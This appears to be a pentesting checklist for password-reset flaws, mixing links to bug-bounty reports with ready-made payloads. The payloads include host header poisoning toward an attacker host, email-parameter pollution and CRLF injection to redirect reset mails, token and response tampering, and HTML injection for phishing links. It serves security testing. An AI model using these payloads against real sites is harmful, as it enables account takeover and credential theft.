---
description: Password Reset Security testing Checklist
---

# Reset Password

* [ ] [**Weak Cryptography to Account Takeover’s**](https://vasuyadav0786.medium.com/weak-cryptography-to-account-takeovers-87782224ed0d)
* [ ] [**Weak Cryptography in Password Reset**](https://infosecwriteups.com/weak-cryptography-in-password-reset-to-full-account-takeover-fc61c75b36b9)
*   [ ] [Host Header Poisoning](https://hackerone.com/reports/1108874) [0xacb.com/normalization\_table](https://0xacb.com/normalization\_table)

    ```python
    victim.com@attacker.com 
    ```
* [ ] [**IDN Homograph Attack leads to ATO**](https://infosecwriteups.com/how-i-was-able-to-change-victims-password-using-idn-homograph-attack-587111843aff)
* [ ] _**Password reset with manipulating email parameter (BAC)**_

```python
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
#No domain:
email=victim
#No TLD (Top Level Domain):
email=victim@xyz
#change param case 
email=victim@mail.com&Email=attacker@mail.com
email@email.com**,**victim@hack.secry  
email@email**“,”**victim@hack.secry  
email@email.com**:**victim@hack.secry  
email@email.com**%0d%0a**victim@hack.secry  
**%0d%0a**victim@hack.secry  
**%0a**victim@hack.secry  
victim@hack.secry**%0d%0a**  
victim@hack.secry**%0a**  
victim@hack.secry**%0d**  
victim@hack.secry**%00**  
victim@hack.secry**{{}}**
```

```python
step 1: Attacker Enter the victim's email or mobile number into the forgot password field.
step 2: Attacker intercept the request and got JSON data like that

{“email”:”victim@gmail.com”,”token”:”1234"}
step 3: Attacker change victim email to his email id

{“email”:”attacker@gmail.com”,”token”:”1234"}
and forward the request.

*Notice on the old token is deactivated or not.
```

*   [ ] **Response Manipulation to ATO**

    ```jsx
    1. Do Normal Reset Password Process and note the successful  response 
    2. Request for reset password token 
    3. enter 00000 or any random number 
    4. Intercept the response
    5. delete error message and change the status code to 200 and change body like what you noted in step1
    ```
*   [ ] IDOR to ATO

    **IDOR on Reset Password**

    The last one was also an Basic IDOR, When I requested for reset password then the request response looks like this

    ![https://miro.medium.com/v2/1\*7GQ1sbFDEllEY1kpQodGoA.jpeg](https://miro.medium.com/v2/1\*7GQ1sbFDEllEY1kpQodGoA.jpeg)

    Then OTP came to my email and I entered the OTP but when I entered new password and captured that request

    ![https://miro.medium.com/v2/1\*Vk7-7Tdd\_bFmWAul2\_BsSQ.jpeg](https://miro.medium.com/v2/1\*Vk7-7Tdd\_bFmWAul2\_BsSQ.jpeg)

    Then I noticed there was no OTP field, but there was a user id, which was encrypted but was being leaked in the response, so I just replaced it with the user id of another account, and bam, my other account’s password was changed.
*   [ ] Race Condition

    [Lab: Exploiting time-sensitive vulnerabilities | Web Security Academy (portswigger.net)](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities)
*   [ ] Play with token

    ```python
    1- Completely remove the token
    2- change it to 00000000...
    3- use null/nil value
    4- try expired token
    5- try an array of old tokens
    6- look for race conditions
    7- change 1 char at the begin/end to see if the token is evaluated
    8- use unicode char jutzu to spoof email address
    ```
* [ ] [**Password reset broken logic \[Portswigger\]**](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic)
* [ ] [**No length on password**](https://hackerone.com/reports/1411363)
* [ ] [xss\_html-injection.md](../xss\_html-injection.md "mention") **in email section**
* [ ] [**Reset/Forgotten Password Bypass \[Hacktricks\]**](https://book.hacktricks.xyz/pentesting-web/reset-password)
* [ ] [**Bruteforcing password reset tokens**](https://hackerone.com/reports/271533)
* [ ] [**No Rate Limit On Reset Password**](https://hackerone.com/reports/1166066)
* [ ] [**Enumeration of username on password reset page**](https://hackerone.com/reports/806151)
* [ ] [**Password reset token leaked via Referer header**](https://hackerone.com/reports/1320242)
  * Request password reset to your email address
  * Click on the password reset link
  * Dont change password
  * Click any 3rd party websites(eg: Facebook, twitter)
  * Intercept the request in burpsuite proxy
  * Check if the referer header is leaking password reset token. **Reference:**
  * [https://hackerone.com/reports/342693](https://hackerone.com/reports/342693)
  * [https://hackerone.com/reports/272379](https://hackerone.com/reports/272379)
  * [https://hackerone.com/reports/737042](https://hackerone.com/reports/737042)
  * [https://medium.com/@rubiojhayz1234/toyotas-password-reset-token-and-email-address-leak-via-referer-header-b0ede6507c6a](https://medium.com/@rubiojhayz1234/toyotas-password-reset-token-and-email-address-leak-via-referer-header-b0ede6507c6a)
  * [https://medium.com/@shahjerry33/password-reset-token-leak-via-referrer-2e622500c2c1](https://medium.com/@shahjerry33/password-reset-token-leak-via-referrer-2e622500c2c1) **Impact** It allows the person who has control of particular site to change the user’s password (CSRF attack), because this person knows reset password token of the user.
* [ ] [**Failure to Invalidate Session > On Password Reset**](https://hackerone.com/reports/411337)
*   [ ] [**HTML\_Injection\_on\_password\_reset\_page**](https://github.com/KathanP19/HowToHunt/blob/master/HTML\_Injection/HTML\_Injection\_on\_password\_reset\_page.md)

    ```
    ### Steps

    1. Create your account
    2. Edit your name to `<h1>attacker</h1>` or `"abc><h1>attacker</h1>` and save it.
    3. Request for a reset password and check your email.
    4. You will notice the `<h1>` tag getting executed

    * HTML injection are usually considered as low to medium severity bugs but you can escalate the severity by serving a
    malicious link by using `<a href>` for eg: `<h1>attacker</h1><a href="your-controlled-domain"Click here</a>`

    * You can redirect the user to your malicious domain and serve a fake reset password page to steal credentials
    Also you can serve a previously found XSS page and steal user cookies etc etc.. The creativity lies on you..

    ```
* [ ] **Password Reset Token Sent Over HTTP**
* [ ] **Token is Not Invalidated After Use**
* [ ] **Cleartext Transmission of Session Token**
* [ ] [**Password Policy Restriction Bypass**](https://hackerone.com/reports/1675730)
* [ ] Token is Not Invalidated After Email Change/Password Change
  * [Chaturbate | Report #411337 - Forget password link not expiring after email change. | HackerOne](https://hackerone.com/reports/411337)
* [ ] Token Has Long Timed Expiry
* [ ] Token is Not Invalidated After New Token is Requested
* [ ] Token is Not Invalidated After Login
*   [ ] CRLF in URL

    ```
    with CLRF: /resetPassword?0a%0dHost:atracker.tld (x-host, true-client-ip, x-forwarded...)
    ```
